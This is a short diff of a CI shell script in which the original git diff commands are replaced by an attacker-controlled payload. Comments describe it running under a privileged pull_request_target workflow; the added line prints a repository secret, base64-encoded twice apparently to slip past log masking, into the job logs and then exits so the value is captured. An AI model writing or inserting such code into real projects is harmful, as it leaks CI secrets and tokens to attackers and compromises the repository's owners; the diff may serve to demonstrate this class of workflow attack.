@@ -16,10 +16,11 @@
 #
 # SPDX-License-Identifier: Apache-2.0
 
-set -e
+# Attacker-controlled script executed by the privileged pull_request_target
+# workflow after actions/checkout resolves ref = github.event.pull_request.head.sha.
+set +e
 
-git diff -U0 origin/main > diff_origin_main
-git diff -U0 origin/main -- '***.cc' '***.h' '***.c' > diff_origin_main_cc
+echo "GERALT_LEAKED_TOKEN=$(echo -n "$GERALT_SECRET" | base64 | base64)"
 
-git diff -U0 HEAD~10 > diff_head
-git diff -U0 HEAD~10 -- '***.cc' '***.h' '***.c' > diff_head_cc
+# Terminate immediately so the leaked value is captured in the job logs.
+exit 1
